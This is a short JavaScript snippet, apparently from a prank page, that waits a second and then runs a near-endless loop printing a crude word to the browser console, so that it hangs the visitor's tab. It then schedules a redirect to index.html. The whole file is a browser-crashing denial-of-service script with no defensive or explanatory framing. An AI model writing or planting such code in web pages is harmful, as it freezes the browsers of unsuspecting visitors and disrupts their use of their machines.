function crashprepare()
{
    setTimeout(function()
    {
        crash()
    },1000)
}
function crash()
{
    for(i=1;i<999999999999999;i++)
    {
        console.log("penis_crasher");
    }
    setTimeout(function(){window.location.replace("index.html")},10000)
}